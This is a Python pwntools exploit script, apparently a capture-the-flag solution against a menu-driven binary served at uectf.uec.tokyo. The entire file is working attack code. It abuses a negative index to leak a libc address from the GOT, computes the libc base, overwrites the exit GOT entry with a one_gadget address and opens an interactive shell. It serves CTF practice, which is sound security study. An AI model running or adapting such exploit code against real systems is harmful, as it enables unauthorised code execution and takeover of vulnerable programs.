#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc-2.31.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("uectf.uec.tokyo", 9003)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        #b *0x40150c
        #b *0x401515
        b *0x401552
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def create(index: int, buf):
    p.sendlineafter(">", "1")
    p.sendlineafter(":", str(index))
    p.sendlineafter(":", buf)

def run(index: int):
    p.sendlineafter(">", "2")
    p.sendlineafter(":", str(index))

def show(index: int):
    p.sendlineafter(">", "3")
    p.sendlineafter(":", str(index))

def edit(index: int, buf):
    p.sendlineafter(">", "4")
    p.sendlineafter(":", str(index))
    p.sendlineafter(":", buf)


name = b't3mp'
p.sendlineafter(":", name)

# libc leak
create(0, p64(elf.got['free']))
show(-6)
p.recvuntil(b'\x20')
free_libc_addr = u64(p.recvline().rstrip(b'\n') + b'\00' * 2)
log.info("free@libc: " + hex(free_libc_addr))
libc_base = free_libc_addr - libc.symbols['free']
log.info("libc base: " + hex(libc_base))

# GOT overwrite
one_gadget_offset = 0xe3b01
one_gadget_addr = libc_base + one_gadget_offset
edit(0, p64(elf.got['exit']))
edit(-6, p64(one_gadget_addr))

p.sendlineafter(">", "5")

p.interactive()
